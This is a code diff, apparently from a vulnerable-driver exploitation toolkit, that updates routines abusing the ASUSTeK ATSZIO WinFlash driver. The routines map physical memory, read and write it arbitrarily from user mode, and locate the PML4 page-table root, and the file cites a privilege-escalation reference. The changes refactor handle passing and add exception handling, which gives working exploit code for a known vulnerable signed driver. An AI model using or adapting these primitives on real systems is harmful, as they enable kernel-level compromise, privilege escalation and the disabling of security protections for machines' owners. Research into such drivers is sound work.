@@ -4,9 +4,9 @@
 *
 *  TITLE:       ATSZIO.CPP
 *
-*  VERSION:     1.00
+*  VERSION:     1.01
 *
-*  DATE:        02 Feb 2020
+*  DATE:        12 Feb 2020
 *
 *  ASUSTeK ATSZIO WinFlash  driver routines.
 *
@@ -27,43 +27,6 @@
 // Another reference https://github.com/LimiQS/AsusDriversPrivEscala
 //
 
-HANDLE g_AtszioMapHandle = NULL;
-
-/*
-* AtszioCallDriver
-*
-* Purpose:
-*
-* Call ASUSTeK ATSZIO driver.
-*
-*/
-BOOL AtszioCallDriver(
-    _In_ HANDLE DeviceHandle,
-    _In_ ULONG IoControlCode,
-    _In_ PVOID InputBuffer,
-    _In_ ULONG InputBufferLength,
-    _In_opt_ PVOID OutputBuffer,
-    _In_opt_ ULONG OutputBufferLength)
-{
-    BOOL bResult = FALSE;
-    IO_STATUS_BLOCK ioStatus;
-
-    NTSTATUS ntStatus = NtDeviceIoControlFile(DeviceHandle,
-        NULL,
-        NULL,
-        NULL,
-        &ioStatus,
-        IoControlCode,
-        InputBuffer,
-        InputBufferLength,
-        OutputBuffer,
-        OutputBufferLength);
-
-    bResult = NT_SUCCESS(ntStatus);
-    SetLastError(RtlNtStatusToDosError(ntStatus));
-    return bResult;
-}
-
 /*
 * AtszioMapMemory
 *
@@ -75,11 +38,15 @@ BOOL AtszioCallDriver(
 PVOID AtszioMapMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
-    _In_ ULONG NumberOfBytes)
+    _In_ ULONG NumberOfBytes,
+    _Out_ HANDLE* SectionHandle
+)
 {
     ULONG_PTR offset;
     ULONG mapSize;
     ATSZIO_PHYSICAL_MEMORY_INFO request;
+
+    *SectionHandle = NULL;
 
     RtlSecureZeroMemory(&request, sizeof(request));
 
@@ -89,14 +56,14 @@ PVOID AtszioMapMemory(
     request.Offset.QuadPart = offset;
     request.ViewSize = mapSize;
 
-    if (AtszioCallDriver(DeviceHandle,
+    if (supCallDriver(DeviceHandle,
         IOCTL_ATSZIO_MAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
         sizeof(request)))
     {
-        g_AtszioMapHandle = request.SectionHandle;
+        *SectionHandle = request.SectionHandle;
         return request.MappedBaseAddress;
     }
 
@@ -113,25 +80,23 @@ PVOID AtszioMapMemory(
 */
 VOID AtszioUnmapMemory(
     _In_ HANDLE DeviceHandle,
-    _In_ PVOID SectionToUnmap
+    _In_ PVOID SectionToUnmap,
+    _In_ HANDLE SectionHandle
 )
 {
     ATSZIO_PHYSICAL_MEMORY_INFO request;
 
     RtlSecureZeroMemory(&request, sizeof(request));
 
-    request.SectionHandle = g_AtszioMapHandle;
+    request.SectionHandle = SectionHandle;
     request.MappedBaseAddress = SectionToUnmap;
 
-    if (AtszioCallDriver(DeviceHandle,
+    supCallDriver(DeviceHandle,
         IOCTL_ATSZIO_UNMAP_USER_PHYSICAL_MEMORY,
         &request,
         sizeof(request),
         &request,
-        sizeof(request)))
-    {
-        g_AtszioMapHandle = NULL;
-    }
+        sizeof(request));
 }
 
 /*
@@ -148,6 +113,7 @@ BOOL WINAPI AtszioQueryPML4Value(
 {
     DWORD dwError = ERROR_SUCCESS;
     ULONG_PTR pbLowStub1M = 0ULL, PML4 = 0;
+    HANDLE sectionHandle = NULL;
 
     *Value = 0;
 
@@ -155,7 +121,8 @@ BOOL WINAPI AtszioQueryPML4Value(
 
         pbLowStub1M = (ULONG_PTR)AtszioMapMemory(DeviceHandle,
             0ULL,
-            0x100000);
+            0x100000,
+            &sectionHandle);
 
         if (pbLowStub1M == 0) {
             dwError = GetLastError();
@@ -168,7 +135,10 @@ BOOL WINAPI AtszioQueryPML4Value(
         else
             *Value = 0;
 
-        AtszioUnmapMemory(DeviceHandle, (PVOID)pbLowStub1M);
+        AtszioUnmapMemory(DeviceHandle,
+            (PVOID)pbLowStub1M,
+            sectionHandle);
+
         dwError = ERROR_SUCCESS;
 
     } while (FALSE);
@@ -188,7 +158,7 @@ BOOL WINAPI AtszioQueryPML4Value(
 BOOL WINAPI AtszioReadWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
-    _In_ PVOID Buffer,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes,
     _In_ BOOLEAN DoWrite)
 {
@@ -196,32 +166,43 @@ BOOL WINAPI AtszioReadWritePhysicalMemory(
     DWORD dwError = ERROR_SUCCESS;
     PVOID mappedSection = NULL;
     ULONG_PTR offset;
+    HANDLE sectionHandle = NULL;
 
     //
     // Map physical memory section.
     //
     mappedSection = AtszioMapMemory(DeviceHandle,
         PhysicalAddress,
-        NumberOfBytes);
+        NumberOfBytes,
+        &sectionHandle);
 
     if (mappedSection) {
 
         offset = PhysicalAddress - (PhysicalAddress & 0xFFFFFFFFFFFFF000);
 
-        if (DoWrite) {
-            RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+        __try {
+
+            if (DoWrite) {
+                RtlCopyMemory(RtlOffsetToPointer(mappedSection, offset), Buffer, NumberOfBytes);
+            }
+            else {
+                RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+            }
+
+            bResult = TRUE;
         }
-        else {
-            RtlCopyMemory(Buffer, RtlOffsetToPointer(mappedSection, offset), NumberOfBytes);
+        __except (EXCEPTION_EXECUTE_HANDLER) {
+            bResult = FALSE;
+            SetLastError(GetExceptionCode());
         }
 
         //
         // Unmap physical memory section.
         //
         AtszioUnmapMemory(DeviceHandle,
-            mappedSection);
+            mappedSection,
+            sectionHandle);
 
-        bResult = TRUE;
     }
     else {
         dwError = GetLastError();
@@ -263,7 +244,7 @@ BOOL WINAPI AtszioReadPhysicalMemory(
 BOOL WINAPI AtszioWritePhysicalMemory(
     _In_ HANDLE DeviceHandle,
     _In_ ULONG_PTR PhysicalAddress,
-    _Out_writes_bytes_(NumberOfBytes) PVOID Buffer,
+    _In_reads_bytes_(NumberOfBytes) PVOID Buffer,
     _In_ ULONG NumberOfBytes)
 {
     return AtszioReadWritePhysicalMemory(DeviceHandle,
